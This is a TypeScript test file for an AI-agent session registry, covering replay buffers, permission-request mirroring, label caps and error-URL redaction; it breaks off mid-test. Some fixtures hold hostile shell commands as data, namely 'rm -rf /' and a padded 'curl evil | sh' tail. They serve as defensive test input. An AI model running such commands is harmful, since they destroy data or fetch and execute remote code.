import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { expandHomePath, foldUsage, resolveCwd, SessionRegistry } from "./registry";
import { PERMISSION_TIMEOUT_MS } from "../adapters/types";
import type { Backend } from "../adapters";
import type { SessionMsg, WireMsg } from "../protocol";
import { SessionCheckpointStore } from "./session-store";

test("resolveCwd defaults to the process cwd", () => {
  assert.equal(resolveCwd(undefined), process.cwd());
});

test("resolveCwd resolves an existing dir to an absolute path", () => {
  const base = mkdtempSync(path.join(os.tmpdir(), "genui-cwd-"));
  assert.equal(resolveCwd(base), path.resolve(base));
});

test("resolveCwd expands a leading ~", () => {
  assert.equal(resolveCwd("~"), os.homedir());
  assert.equal(
    expandHomePath("~\\Projects\\mirafold", "C:\\Users\\Kyle"),
    "C:\\Users\\Kyle\\Projects\\mirafold",
  );
});

test("resolveCwd throws on a missing directory", () => {
  assert.throws(() => resolveCwd("/no/such/dir/genui-nope"), /no such directory/);
});

test("resolveCwd throws when the path is a file, not a directory", () => {
  const base = mkdtempSync(path.join(os.tmpdir(), "genui-cwd-"));
  const file = path.join(base, "f.txt");
  writeFileSync(file, "x");
  assert.throws(() => resolveCwd(file), /not a directory/);
});

// Ring-buffer eviction and the resume boundary, unit-tested directly
// against SessionRegistry with a mock backend (live:false → the inert
// MockSession; no daemon, no network, and nothing emitted until a prompt is
// pushed, so the ring holds exactly what we broadcast). We drive
// broadcast()/canResume()/attach() by hand and inspect the ring (Q.3).
const MOCK_BACKEND: Backend = { agent: "claude-code", kind: "none", live: false };
// Mirror of BUFFER_CAP in registry.ts (module-private, so not importable). Kept
// in sync by hand — a cap change must update this, which is deliberate: pinning
// the absolute value is what makes an off-by-one in the ring size fail here.
const BUFFER_CAP = 4000;
const PUSH = BUFFER_CAP + 500; // exceed the cap so eviction fires

function freshSession() {
  // deltaCoalesceMs 0: deltas pass straight through, so these tests can
  // drive broadcast() by hand and inspect state between synchronous calls.
  // The coalescing window itself has its own tests below.
  const reg = new SessionRegistry({ backend: MOCK_BACKEND, deltaCoalesceMs: 0 });
  const dir = mkdtempSync(path.join(os.tmpdir(), "genui-reg-"));
  const entry = reg.create({ cwd: dir });
  assert.equal(entry.ring.buffer.length, 0); // create() streams nothing
  assert.equal(entry.ring.nextSeq, 1);
  return { reg, entry };
}

test("an active rename rolls back when its checkpoint cannot be written", () => {
  const store = new SessionCheckpointStore(mkdtempSync(path.join(os.tmpdir(), "genui-rename-store-")));
  const reg = new SessionRegistry({ backend: MOCK_BACKEND, deltaCoalesceMs: 0, store: store });
  const dir = mkdtempSync(path.join(os.tmpdir(), "genui-rename-root-"));
  const entry = reg.create({ cwd: dir });
  const previous = entry.name;
  (store as unknown as { write: () => void }).write = () => {
    throw new Error("disk is read-only");
  };

  assert.equal(reg.rename(entry.id, "name that must not lie"), false);
  assert.equal(entry.name, previous);
  assert.equal(reg.summary().find((row) => row.sessionId === entry.id)?.name, previous);
  reg.end(entry.id);
});

const delta = (): SessionMsg => ({ type: "text_delta", text: "x" });

test("prompt options are a replaceable unsequenced session snapshot, not transcript history", () => {
  const { reg, entry } = freshSession();
  reg.broadcast(entry, {
    type: "prompt_options",
    options: [{ trigger: "/", value: "/review", label: "review", kind: "command" }],
  });
  assert.equal(entry.ring.buffer.length, 0);
  assert.equal(entry.ring.nextSeq, 1);
  const seen: WireMsg[] = [];
  reg.attach(entry, (msg) => seen.push(msg));
  assert.deepEqual(seen, [
    {
      type: "prompt_options",
      options: [{ trigger: "/", value: "/review", label: "review", kind: "command" }],
    },
  ]);
  reg.end(entry.id);
});

test("prompt option metadata is bounded before fanout or persistence", () => {
  const { reg, entry } = freshSession();
  const seen: WireMsg[] = [];
  reg.attach(entry, (msg) => seen.push(msg));
  reg.broadcast(entry, {
    type: "prompt_options",
    options: [
      {
        trigger: "/",
        value: "/review",
        label: "r".repeat(500),
        description: "d".repeat(1_000),
        argumentHint: "a".repeat(500),
        aliases: Array.from({ length: 40 }, (_, index) => `alias-${index}`),
        kind: "command",
      },
      {
        trigger: "$",
        value: `$${"x".repeat(500)}`,
        label: "too large to be a real command",
        kind: "skill",
      },
      ...Array.from({ length: 600 }, (_, index) => ({
        trigger: "/" as const,
        value: `/command-${index}`,
        label: `command-${index}`,
        kind: "command" as const,
      })),
    ],
  });

  const catalog = seen.at(-1);
  assert.equal(catalog?.type, "prompt_options");
  if (catalog?.type !== "prompt_options") return;
  assert.equal(catalog.options.length, 499); // invalid oversized value was dropped after the 500-row cap
  assert.equal(catalog.options[0].label.length, 121);
  assert.equal(catalog.options[0].description?.length, 501);
  assert.equal(catalog.options[0].argumentHint?.length, 201);
  assert.equal(catalog.options[0].aliases?.length, 20);
  assert.deepEqual(entry.promptOptions, catalog.options);
  reg.end(entry.id);
});

test("UX.8: prompt catalog rendering controls are dropped before trusted-shell fanout", () => {
  const { reg, entry } = freshSession();
  const seen: WireMsg[] = [];
  reg.attach(entry, (msg) => seen.push(msg));
  reg.broadcast(entry, {
    type: "prompt_options",
    options: [
      {
        trigger: "$",
        value: "$safe",
        label: "safe",
        description: "Codex-provided but visibly attributed",
        kind: "skill",
        source: "codex",
      },
      {
        trigger: "$",
        value: "$deceptive",
        label: "Mirafold says yes\u202Etxt",
        kind: "skill",
        source: "codex",
      },
    ],
  });

  const catalog = seen.at(-1);
  assert.equal(catalog?.type, "prompt_options");
  if (catalog?.type !== "prompt_options") return;
  assert.deepEqual(catalog.options.map((option) => option.value), ["$safe"]);
  assert.equal(catalog.options[0].source, "codex");
  assert.deepEqual(entry.promptOptions, catalog.options);
  reg.end(entry.id);
});

// Mirror of BUFFER_MAX_BYTES, same hand-kept convention as BUFFER_CAP above.
const BUFFER_MAX_BYTES = 32_000_000;

/** One image-sized render — the payload class the byte cap exists for: a
 *  short agent-authored path becomes a multi-megabyte data: URI. */
const bigRender = (mb: number): SessionMsg => ({
  type: "render",
  component: "image",
  props: { path: "shot.png", alt: "x", src: `data:image/png;base64,${"A".repeat(mb * 1_000_000)}` },
  id: "img",
});

test("the replay byte budget counts UTF-8 bytes, not JavaScript code units", () => {
  const { reg, entry } = freshSession();
  reg.broadcast(entry, { type: "text_delta", text: "😀" });
  assert.equal(
    entry.ring.bytes,
    Buffer.byteLength(JSON.stringify(entry.ring.buffer[0])),
  );
  assert.ok(entry.ring.bytes > JSON.stringify(entry.ring.buffer[0]).length);
  reg.end(entry.id);
});

// 2026-07-27 audit. The count cap alone assumed every message was text the
// agent had to type; render_image broke that (six characters of path → 2 MB
// buffered, no permission prompt). Measured before the fix: 40 image renders
// held 96 MB, with the count cap's own ceiling around 10 GB.
test("audit: the ring is capped by BYTES too — image renders can't grow the session unbounded", () => {
  const { reg, entry } = freshSession();
  for (let i = 0; i < 60; i++) reg.broadcast(entry, bigRender(2));

  assert.ok(
    entry.ring.bytes <= BUFFER_MAX_BYTES,
    `buffer held ${(entry.ring.bytes / 1e6).toFixed(0)} MB, over the ${BUFFER_MAX_BYTES / 1e6} MB cap`,
  );
  // Nowhere near the COUNT cap — so it was the byte cap that trimmed, which
  // is the whole point of this test.
  assert.ok(entry.ring.buffer.length < BUFFER_CAP, "count cap did the trimming, not the byte cap");
  assert.ok(entry.ring.buffer.length > 0, "the ring must not empty itself");
  // The running total stays honest against a recount of what's retained.
  const recounted = entry.ring.buffer.reduce(
    (sum, m) => sum + Buffer.byteLength(JSON.stringify(m)),
    0,
  );
  assert.equal(entry.ring.bytes, recounted);
  // Newest is always kept; eviction is oldest-first, so seqs stay contiguous.
  assert.equal(entry.ring.buffer[entry.ring.buffer.length - 1].seq, 60);
  for (let k = 1; k < entry.ring.buffer.length; k++) {
    assert.equal(entry.ring.buffer[k].seq, entry.ring.buffer[k - 1].seq! + 1);
  }
  reg.end(entry.id);
});

test("audit: one payload larger than the whole byte budget still replays", () => {
  // The source-side caps bound a single message (the image resolver refuses
  // past 2 MB); the ring must not answer an oversize message by emptying.
  const { reg, entry } = freshSession();
  reg.broadcast(entry, delta());
  reg.broadcast(entry, bigRender(40));
  assert.equal(entry.ring.buffer.length, 1);
  assert.equal(entry.ring.buffer[0].type, "render");
  assert.equal(entry.ring.bytes, JSON.stringify(entry.ring.buffer[0]).length);
  reg.end(entry.id);
});

test("audit: text sessions are untouched by the byte cap — the count cap still owns them", () => {
  // A regression here would mean the byte cap started trimming ordinary
  // sessions, silently shortening everyone's replay history.
  const { reg, entry } = freshSession();
  for (let i = 0; i < PUSH; i++) reg.broadcast(entry, delta());
  assert.equal(entry.ring.buffer.length, BUFFER_CAP);
  assert.ok(entry.ring.bytes < BUFFER_MAX_BYTES / 100, "text sessions sit far under the byte cap");
  reg.end(entry.id);
});

test("Q.3 ring buffer stays bounded and holds exactly the newest window after eviction", () => {
  const { reg, entry } = freshSession();
  for (let i = 0; i < PUSH; i++) reg.broadcast(entry, delta());

  const cap = entry.ring.buffer.length;
  assert.equal(cap, BUFFER_CAP); // bounded at EXACTLY the cap — a ±1 off-by-one fails here
  assert.equal(entry.ring.nextSeq, PUSH + 1); // seqs 1..PUSH were issued in order

  // The retained window is the NEWEST `cap` messages, contiguous by seq, with
  // the oldest (seq 1) evicted — an off-by-one in the splice would fail one of
  // these.
  assert.equal(entry.ring.buffer[cap - 1].seq, PUSH); // newest kept
  assert.equal(entry.ring.buffer[0].seq, PUSH - cap + 1); // oldest kept = start of the newest window
  assert.ok(entry.ring.buffer[0].seq! > 1, "seq 1 must have fallen off the ring");
  for (let k = 0; k < cap; k++) {
    assert.equal(entry.ring.buffer[k].seq, PUSH - cap + 1 + k); // no gaps in the window
  }
  reg.end(entry.id);
});

test("Q.3 a late attach (no afterSeq) replays exactly the retained window, in order", () => {
  const { reg, entry } = freshSession();
  for (let i = 0; i < PUSH; i++) reg.broadcast(entry, delta());
  const cap = entry.ring.buffer.length;

  const seen: number[] = [];
  reg.attach(entry, (m) => {
    if (m.seq !== undefined) seen.push(m.seq);
  });
  assert.equal(seen.length, cap);
  assert.equal(seen[0], PUSH - cap + 1);
  assert.equal(seen[seen.length - 1], PUSH);
  for (let k = 1; k < seen.length; k++) assert.equal(seen[k], seen[k - 1] + 1); // contiguous
  reg.end(entry.id);
});

test("Q.3 canResume flips false at exactly the evicted edge (the off-by-one)", () => {
  const { reg, entry } = freshSession();
  for (let i = 0; i < PUSH; i++) reg.broadcast(entry, delta());
  const firstBuffered = entry.ring.buffer[0].seq!;

  // A viewport that last saw (firstBuffered - 1) can tail-resume: every seq it
  // hasn't seen is still buffered. One earlier, and the message at
  // (firstBuffered - 1) has itself fallen off — a gap — so resume is refused.
  // These two lines are the boundary an off-by-one in either direction fails.
  assert.equal(reg.canResume(entry, firstBuffered - 1), true); // exact edge: resumable
  assert.equal(reg.canResume(entry, firstBuffered - 2), false); // one past: gap, must refuse

  // Range guards: saw-the-latest resumes (empty tail); a seq never issued and
  // malformed inputs are refused.
  assert.equal(reg.canResume(entry, entry.ring.nextSeq - 1), true);
  assert.equal(reg.canResume(entry, entry.ring.nextSeq), false);
  assert.equal(reg.canResume(entry, -1), false);
  assert.equal(reg.canResume(entry, 1.5), false);
  reg.end(entry.id);
});

test("Q.3 a valid post-eviction tail resume replays exactly the unseen tail", () => {
  const { reg, entry } = freshSession();
  for (let i = 0; i < PUSH; i++) reg.broadcast(entry, delta());
  const firstBuffered = entry.ring.buffer[0].seq!;

  // Resume from the exact edge → the whole retained window, nothing dropped.
  const fromEdge: number[] = [];
  const vp1 = (m: WireMsg) => {
    if (m.seq !== undefined) fromEdge.push(m.seq);
  };
  reg.attach(entry, vp1, firstBuffered - 1);
  assert.equal(fromEdge[0], firstBuffered);
  assert.equal(fromEdge[fromEdge.length - 1], PUSH);
  assert.equal(fromEdge.length, entry.ring.buffer.length);
  reg.detach(entry, vp1);

  // Resume from a mid-window seq → only strictly-greater seqs replay.
  const mid = firstBuffered + 100;
  const fromMid: number[] = [];
  reg.attach(entry, (m) => {
    if (m.seq !== undefined) fromMid.push(m.seq);
  }, mid);
  assert.equal(fromMid[0], mid + 1);
  assert.equal(fromMid[fromMid.length - 1], PUSH);
  assert.ok(fromMid.every((s) => s > mid));
  reg.end(entry.id);
});

test("Q.3 canResume on a small (un-evicted) buffer: seq 0 replays from the very start", () => {
  const { reg, entry } = freshSession();
  for (let i = 0; i < 5; i++) reg.broadcast(entry, delta()); // seqs 1..5, nothing evicted
  assert.equal(entry.ring.buffer[0].seq, 1);
  assert.equal(reg.canResume(entry, 0), true); // saw nothing yet → full tail replay
  assert.equal(reg.canResume(entry, 5), true); // saw all → empty tail
  assert.equal(reg.canResume(entry, 6), false); // beyond what was issued

  const seen: number[] = [];
  reg.attach(entry, (m) => {
    if (m.seq !== undefined) seen.push(m.seq);
  }, 0);
  assert.deepEqual(seen, [1, 2, 3, 4, 5]);
  reg.end(entry.id);
});

// ---- Delta coalescing: consecutive text/thinking deltas merge into one
// buffered WireMsg (its text the concatenation), flushed by the window timer
// or by any other message arriving — order preserved either way.

function coalescingSession(windowMs: number) {
  const reg = new SessionRegistry({ backend: MOCK_BACKEND, deltaCoalesceMs: windowMs });
  const dir = mkdtempSync(path.join(os.tmpdir(), "genui-reg-"));
  const entry = reg.create({ cwd: dir });
  const seen: WireMsg[] = [];
  reg.attach(entry, (m) => seen.push(m));
  seen.length = 0; // prompt_options is attach metadata, not transcript traffic
  return { reg, entry, seen };
}

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

test("coalescing: consecutive text deltas merge into ONE message — ring, viewport, and seq agree", async () => {
  const { reg, entry, seen } = coalescingSession(5);
  reg.broadcast(entry, { type: "text_delta", text: "a" });
  reg.broadcast(entry, { type: "text_delta", text: "b" });
  reg.broadcast(entry, { type: "text_delta", text: "c" });
  assert.equal(entry.ring.buffer.length, 0, "nothing enters the ring inside the window");
  await sleep(25);
  assert.equal(entry.ring.buffer.length, 1);
  assert.deepEqual(entry.ring.buffer[0], { type: "text_delta", text: "abc", seq: 1 });
  assert.deepEqual(seen, [{ type: "text_delta", text: "abc", seq: 1 }]);
  // The byte accounting counts the MERGED message, nothing else.
  assert.equal(entry.ring.bytes, JSON.stringify(entry.ring.buffer[0]).length);
  reg.end(entry.id);
});

test("coalescing: any non-delta message flushes the window first — order preserved, no timer needed", () => {
  const { reg, entry, seen } = coalescingSession(60_000);
  reg.broadcast(entry, { type: "text_delta", text: "hel" });
  reg.broadcast(entry, { type: "text_delta", text: "lo" });
  reg.broadcast(entry, { type: "turn_end" });
  assert.deepEqual(
    seen.map((m) => m.type),
    ["text_delta", "turn_end"],
  );
  assert.equal((seen[0] as { text: string }).text, "hello");
  assert.deepEqual(
    seen.map((m) => m.seq),
    [1, 2],
    "the merged delta keeps its stream position ahead of the flusher",
  );
  reg.end(entry.id);
});

test("coalescing: a different parentId flushes — one subagent's prose never merges into another's (SA.2)", () => {
  const { reg, entry, seen } = coalescingSession(60_000);
  reg.broadcast(entry, { type: "text_delta", text: "parent " });
  reg.broadcast(entry, { type: "text_delta", text: "prose" });
  reg.broadcast(entry, { type: "text_delta", text: "child A", parentId: "taskA" });
  reg.broadcast(entry, { type: "text_delta", text: " more A", parentId: "taskA" });
  reg.broadcast(entry, { type: "text_delta", text: "child B", parentId: "taskB" });
  reg.broadcast(entry, { type: "turn_end" });
  assert.deepEqual(seen, [
    { type: "text_delta", text: "parent prose", seq: 1 },
    { type: "text_delta", text: "child A more A", parentId: "taskA", seq: 2 },
    { type: "text_delta", text: "child B", parentId: "taskB", seq: 3 },
    { type: "turn_end", seq: 4 },
  ]);
  reg.end(entry.id);
});

test("coalescing: a delta of the OTHER type flushes too — thinking and text never merge together", () => {
  const { reg, entry, seen } = coalescingSession(60_000);
  reg.broadcast(entry, { type: "thinking_delta", text: "hm" });
  reg.broadcast(entry, { type: "thinking_delta", text: "m." });
  reg.broadcast(entry, { type: "text_delta", text: "Right" });
  reg.broadcast(entry, { type: "turn_end" });
  assert.deepEqual(seen, [
    { type: "thinking_delta", text: "hmm.", seq: 1 },
    { type: "text_delta", text: "Right", seq: 2 },
    { type: "turn_end", seq: 3 },
  ]);
  reg.end(entry.id);
});

test("coalescing: attach, detach, and end flush the open window", () => {
  const { reg, entry, seen } = coalescingSession(60_000);
  reg.broadcast(entry, { type: "text_delta", text: "tail" });
  // A new viewport's replay must include the held tail.
  const replayed: WireMsg[] = [];
  const vp = (m: WireMsg) => {
    if (m.type !== "prompt_options") replayed.push(m);
  };
  reg.attach(entry, vp);
  // 2026-07-29: frames arriving via attach-replay carry the replay stamp.
  assert.deepEqual(replayed, [{ type: "text_delta", text: "tail", seq: 1, replay: true }]);
  assert.deepEqual(
    seen,
    [{ type: "text_delta", text: "tail", seq: 1 }],
    "the original viewport got the flush live — unstamped",
  );
  // Detach flushes whatever is pending at that moment.
  reg.broadcast(entry, { type: "text_delta", text: " end" });
  reg.detach(entry, vp);
  assert.equal((seen.at(-1) as { text: string }).text, " end");
  // End flushes before session_ended reaches the survivors.
  reg.broadcast(entry, { type: "text_delta", text: "bye" });
  reg.end(entry.id);
  assert.deepEqual(
    seen.slice(-2).map((m) => m.type),
    ["text_delta", "session_ended"],
  );
  assert.equal((seen.at(-2) as { text: string }).text, "bye");
});

// ---- Phase M.1: cockpit metadata derived in broadcast() --------------------
// Driven in-process like the Q.3 ring tests above — broadcast() by hand,
// entry state inspected directly, so every transition is deterministic. The
// over-the-socket proof (real daemon, real watcher, mock pacing) is
// fleet-cockpit.itest.ts.

test("M.1 foldUsage sums per-turn tokens", () => {
  const first = foldUsage(undefined, { inputTokens: 100, outputTokens: 10 });
  assert.deepEqual(first, { inputTokens: 100, outputTokens: 10 });
  assert.deepEqual(foldUsage(first, { inputTokens: 50, outputTokens: 5 }), {
    inputTokens: 150,
    outputTokens: 15,
  });
});

test("M.1 foldUsage TAKES costUsd (session-cumulative), never sums it", () => {
  const first = foldUsage(undefined, { inputTokens: 1, outputTokens: 1, costUsd: 0.1 });
  const second = foldUsage(first, { inputTokens: 1, outputTokens: 1, costUsd: 0.25 });
  assert.equal(second.costUsd, 0.25, "the cumulative figure replaces, not adds");
  const later = foldUsage(second, { inputTokens: 1, outputTokens: 1 });
  assert.equal(later.costUsd, 0.25, "a report without cost keeps the last one");
});

test("M.1 foldUsage invents no cost when none was ever reported", () => {
  const folded = foldUsage(foldUsage(undefined, { inputTokens: 1, outputTokens: 1 }), {
    inputTokens: 1,
    outputTokens: 1,
  });
  assert.ok(!("costUsd" in folded), "absent cost stays absent — never a stand-in");
});

test("M.1 activity follows the status stream; since resets only on a label CHANGE; idle clears", () => {
  const { reg, entry } = freshSession();
  reg.broadcast(entry, { type: "status", state: "thinking" });
  assert.equal(entry.activity?.label, "thinking");
  const since = entry.activity!.since;
  reg.broadcast(entry, { type: "status", state: "thinking" }); // re-announced, same label
  assert.equal(entry.activity!.since, since, "identical label keeps its elapsed time");
  reg.broadcast(entry, { type: "status", state: "tool", label: "Bash" });
  assert.equal(entry.activity?.label, "Bash");
  reg.broadcast(entry, { type: "text_delta", text: "x" });
  assert.equal(entry.activity?.label, "Bash", "text streaming keeps the label — OutputZone parity");
  reg.broadcast(entry, { type: "turn_end" });
  assert.equal(entry.activity, undefined, "cleared at idle");
  reg.end(entry.id);
});

test("M.1 bang activity: first line only, capped, cleared at bang_end", () => {
  const { reg, entry } = freshSession();
  reg.broadcast(entry, { type: "bang_start", command: "echo hi\nrm -rf /", id: "b1" });
  assert.equal(entry.activity?.label, "! echo hi");
  reg.broadcast(entry, { type: "bang_start", command: "x".repeat(200), id: "b2" });
  assert.equal(entry.activity!.label.length, "! ".length + 80);
  reg.broadcast(entry, { type: "bang_end", id: "b2", exitCode: 0 });
  assert.equal(entry.activity, undefined);
  reg.end(entry.id);
});

test("M.1 each pending permission lives until ITS OWN resolution — never wiped by stream movement", () => {
  const { reg, entry } = freshSession();
  reg.broadcast(entry, { type: "permission_request", tool: "Bash", detail: "rm -rf x", id: "p1" });
  assert.equal(entry.status, "permission");
  // A second concurrent request stacks, oldest first — no clear.
  reg.broadcast(entry, { type: "permission_request", tool: "Write", detail: "f.txt", id: "p2" });
  assert.deepEqual(
    entry.permissions.map((p) => p.id),
    ["p1", "p2"],
  );
  // Answering the first removes exactly that one.
  reg.answerPermission(entry.id, "p1", true);
  assert.deepEqual(
    entry.permissions.map((p) => p.id),
    ["p2"],
  );
  // The approved tool's stream moving must NOT wipe the still-pending ask —
  // the 2026-07-24 bug: with concurrent requests, the first answer's tool
  // output silently dropped the rest off the fleet forever.
  reg.broadcast(entry, { type: "tool_use", name: "Bash", detail: "rm -rf x", id: "t1" });
  assert.equal(entry.status, "working");
  assert.deepEqual(
    entry.permissions.map((p) => p.id),
    ["p2"],
    "a pending ask survives the stream moving",
  );
  // A terminal state clears whatever is left — nothing can still be pending.
  reg.broadcast(entry, { type: "turn_end" });
  assert.deepEqual(entry.permissions, []);
  reg.end(entry.id);
});

test("2026-07-28 a permission_resolved broadcast drops exactly its ask; the hold lifts only when none pend", () => {
  const { reg, entry } = freshSession();
  reg.broadcast(entry, { type: "permission_request", tool: "Bash", detail: "rm -rf x", id: "p1" });
  reg.broadcast(entry, { type: "permission_request", tool: "Write", detail: "f.txt", id: "p2" });
  // The adapter announced p1's resolution (timeout path: answerPermission
  // never ran, so only this broadcast can clear the mirror). The second ask
  // still pends — the status hold must survive.
  reg.broadcast(entry, { type: "permission_resolved", id: "p1", allow: false });
  assert.deepEqual(
    entry.permissions.map((p) => p.id),
    ["p2"],
  );
  assert.equal(entry.status, "permission", "a still-pending ask keeps the hold");
  // The last resolution releases the hold — the turn is running again.
  reg.broadcast(entry, { type: "permission_resolved", id: "p2", allow: true });
  assert.deepEqual(entry.permissions, []);
  assert.equal(entry.status, "working");
  reg.end(entry.id);
});

// Mirror of PERMISSION_MIRROR_CAP in registry.ts (module-private, like
// BUFFER_CAP above). Pinning the absolute value is deliberate: a cap change
// must consciously update this test.
const PERMISSION_MIRROR_CAP = 25;

test("2026-07-24 audit: a permission flood can't grow fleet snapshots without bound", () => {
  const { reg, entry } = freshSession();
  for (let i = 0; i < 100; i++) {
    reg.broadcast(entry, {
      type: "permission_request",
      tool: "Bash",
      detail: "d".repeat(2_000),
      id: `p${i}`,
    });
  }
  assert.equal(entry.permissions.length, PERMISSION_MIRROR_CAP, "the mirror holds the cap, not the flood");
  // Oldest evicted first — the kept asks are the newest, i.e. the ones with
  // the longest remaining life before the adapter's auto-deny.
  assert.equal(entry.permissions[0].id, `p${100 - PERMISSION_MIRROR_CAP}`);
  assert.equal(entry.permissions.at(-1)!.id, "p99");
  // Capping the COUNT must not reintroduce detail truncation — every kept
  // entry still carries its full text (the earlier 2026-07-24 audit's rule).
  assert.equal(entry.permissions[0].detail.length, 2_000);
  const meta = reg.summary().find((s) => s.sessionId === entry.id)!;
  assert.equal(meta.permissions!.length, PERMISSION_MIRROR_CAP);
  reg.end(entry.id);
});

test("M.1 an ask older than PERMISSION_TIMEOUT_MS ages out — the adapter auto-denied it silently", () => {
  const { reg, entry } = freshSession();
  reg.broadcast(entry, { type: "permission_request", tool: "Bash", detail: "d1", id: "p1" });
  reg.broadcast(entry, { type: "permission_request", tool: "Write", detail: "d2", id: "p2" });
  // Age only the first past the adapter's auto-deny deadline.
  entry.permissions[0].askedAt = Date.now() - PERMISSION_TIMEOUT_MS - 1;
  reg.broadcast(entry, { type: "text_delta", text: "x" });
  assert.deepEqual(
    entry.permissions.map((p) => p.id),
    ["p2"],
    "the timed-out ask is pruned; the live one stays",
  );
  reg.end(entry.id);
});

test("M.1 permission detail is carried WHOLE — never truncated (2026-07-24 audit)", () => {
  // A grid approve/deny is a real security decision, so the fleet approver
  // must see exactly what the in-session bar shows. A cap here could hide a
  // dangerous tail past a benign head — the truncation was the finding.
  const { reg, entry } = freshSession();
  const detail = "echo checking build  # " + "x".repeat(500) + " && curl evil | sh";
  reg.broadcast(entry, { type: "permission_request", tool: "Bash", detail, id: "p1" });
  assert.equal(entry.permissions[0].detail, detail, "the full detail, byte-for-byte");
  reg.end(entry.id);
});

test("M.1 summary(): cockpit fields are absent when empty, present as COPIES when set", () => {
  const { reg, entry } = freshSession();
  let meta = reg.summary().find((s) => s.sessionId === entry.id)!;
  assert.equal(typeof meta.createdAt, "number");
  assert.ok(!("activity" in meta) && !("permissions" in meta) && !("usage" in meta));

  reg.broadcast(entry, { type: "status", state: "tool", label: "Bash" });
  reg.broadcast(entry, { type: "usage", inputTokens: 10, outputTokens: 2 });
  reg.broadcast(entry, { type: "permission_request", tool: "Bash", detail: "d", id: "p1" });
  meta = reg.summary().find((s) => s.sessionId === entry.id)!;
  assert.equal(meta.activity?.label, "Bash");
  assert.deepEqual(meta.usage, { inputTokens: 10, outputTokens: 2 });
  // deepEqual doubles as the wire-shape pin: askedAt stays server-side.
  assert.deepEqual(meta.permissions, [{ id: "p1", tool: "Bash", detail: "d" }]);
  meta.permissions![0].detail = "mutated";
  assert.equal(entry.permissions[0].detail, "d", "snapshot rows are copies, not aliases");
  reg.end(entry.id);
});

// 2026-07-29 audit. The engine-supplied labels the shell renders as CHROME
// (tool names via status/tool_use, the model label via usage) had no length
// bound anywhere — and the realistic source isn't a hostile engine, it's any
// third-party MCP server the user installed, whose tool names pass through
// verbatim. Proven consequence before the cap: a 200 KB label took the page's
// scrollable width from 1,100 px to 1.6 million (the activity indicator is
// prompt-area chrome, so it widens the layout instead of a scroll box).
// Capping in broadcast() puts the bound BEFORE the ring, the cockpit
// derivation and every viewport, so replay and fleet snapshots inherit it.
const LABEL_CAP = 120; // mirror of registry.ts, same hand-kept convention as BUFFER_CAP

test("audit: engine-supplied labels are capped before they reach the ring", () => {
  const { reg, entry } = freshSession();
  const huge = "A".repeat(200_000);
  reg.broadcast(entry, { type: "status", state: "tool", label: huge });
  reg.broadcast(entry, { type: "tool_use", name: huge, id: "t1" });
  reg.broadcast(entry, { type: "usage", inputTokens: 1, outputTokens: 1, model: huge });

  const [status, toolUse, usage] = entry.ring.buffer as [
    Extract<WireMsg, { type: "status" }>,
    Extract<WireMsg, { type: "tool_use" }>,
    Extract<WireMsg, { type: "usage" }>,
  ];
  assert.equal(status.label!.length, LABEL_CAP + 1, "status.label keeps the cap + ellipsis");
  assert.equal(toolUse.name.length, LABEL_CAP + 1);
  assert.equal(usage.model!.length, LABEL_CAP + 1);
  assert.ok(status.label!.endsWith("…"), "a truncated label says so");
  // The fleet mirror inherits the bound (it derives from the same call).
  const meta = reg.summary().find((s) => s.sessionId === entry.id)!;
  assert.equal(meta.activity!.label.length, LABEL_CAP + 1);
  reg.end(entry.id);
});

test("audit: ordinary labels pass through untouched (the cap is not a rewrite)", () => {
  const { reg, entry } = freshSession();
  reg.broadcast(entry, { type: "status", state: "tool", label: "Bash" });
  reg.broadcast(entry, { type: "tool_use", name: "mcp__github__create_issue", id: "t1" });
  const [status, toolUse] = entry.ring.buffer as [
    Extract<WireMsg, { type: "status" }>,
    Extract<WireMsg, { type: "tool_use" }>,
  ];
  assert.equal(status.label, "Bash");
  assert.equal(toolUse.name, "mcp__github__create_issue");
  reg.end(entry.id);
});

test("UX.8: provider error URL credentials are scrubbed before wire, checkpoint ring, and logs", () => {
  const { reg, entry } = freshSession();
  const seen: WireMsg[] = [];
  reg.attach(entry, (msg) => seen.push(msg));
  reg.broadcast(entry, {
    type: "error",
    message: "failed https://alice:password@example.test/v1?sig=topsecret#fragment",
  });
  const wireError = seen.find((msg) => msg.type === "error");
  const storedError = entry.ring.buffer.find((msg) => msg.type === "error");
  for (const msg of [wireError, storedError]) {
    assert.equal(msg?.type, "error");
    if (msg?.type === "error") {
      assert.doesNotMatch(msg.message, /alice|password|topsecret|fragment/);
      assert.match(msg.message, /\[redacted\]/);
    }
  }
  reg.end(entry.id);
});

// 2026-07-29 bughunt: bang_end sat in the terminal-status list, so a `!`
// command finishing BESIDE a paused model turn read as "turn over" — the
// fleet row flipped idle, its pending-permission mirror was wiped (allow/
// deny gone from mission control while the ask was still live at the
// adapter — the 2026-07-24 bug class through a different door), and the
// mid-turn burst gate re-opened.

test("a `!` bang beside a pending ask never wipes it — bang traffic is not turn grammar", () => {
  const { reg, entry } = freshSession();
  reg.broadcast(entry, { type: "permission_request", tool: "Bash", detail: "rm -rf /", id: "p1" });
  assert.equal(entry.status, "permission");
  reg.broadcast(entry, { type: "bang_start", command: "git diff", id: "b1" });
  assert.equal(entry.status, "permission", "bang traffic does not lift the hold");
  reg.broadcast(entry, { type: "bang_output", data: "diff --git …", id: "b1" });
  assert.equal(entry.status, "permission");
  reg.broadcast(entry, { type: "bang_end", id: "b1", exitCode: 0 });
  assert.equal(entry.status, "permission", "the row still sorts needs-you-first");
  assert.deepEqual(
    entry.permissions.map((p) => p.id),
    ["p1"],
    "the ask keeps its fleet allow/deny until ITS OWN resolution",
  );
  reg.end(entry.id);
});

test("bang_end on an ask-free session still reads idle (the M.1 behavior stands)", () => {
  const { reg, entry } = freshSession();
  reg.broadcast(entry, { type: "bang_start", command: "ls", id: "b1" });
  assert.equal(entry.status, "working");
  reg.broadcast(entry, { type: "bang_end", id: "b1", exitCode: 0 });
  assert.equal(entry.status, "idle");
  assert.equal(entry.activity, undefined);
  reg.end(entry.id);
});

test("bang_end beside an active model turn stays working and never reopens the prompt gate", () => {
  const { reg, entry } = freshSession();
  assert.equal(reg.dispatchPrompt(entry, "first"), true);
  assert.equal(entry.modelTurnsPending, 1);
  assert.equal(reg.dispatchPrompt(entry, "queued"), true);
  assert.equal(entry.modelTurnsPending, 2);
  assert.equal(reg.dispatchPrompt(entry, "refused before bang"), false);

  reg.broadcast(entry, { type: "bang_start", command: "git status", id: "b1" });
  reg.broadcast(entry, { type: "bang_end", id: "b1", exitCode: 0 });
